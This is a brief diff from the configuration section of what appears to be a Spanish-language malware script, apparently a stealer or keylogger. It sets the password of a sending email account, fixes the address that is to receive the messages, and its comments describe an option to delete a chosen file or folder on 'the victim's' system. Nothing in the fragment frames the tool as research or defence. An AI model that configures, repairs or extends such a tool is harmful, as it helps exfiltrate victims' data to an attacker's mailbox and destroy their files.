@@ -12,7 +12,7 @@ _PasswordEmail = "C0NTR4S3Ñ4"
 #---Ingrese la direccion a la que quiere que lleguen los mensajes,
 #esta vez puede ser un hotmail, u otro correo, hasta uno temporal,
 #o puede ser la misma que ingreso arriba:
-_SendTo= "correo|gmail.com"
+_SendTo= "correo@gmail.com"
 
 #---Por ultimo, si desea borrar un archivo en especifico del sistema d la victima,
 #o una carpeta, cambie a True la opcion _Confirmacion, si no desea borrar nada,
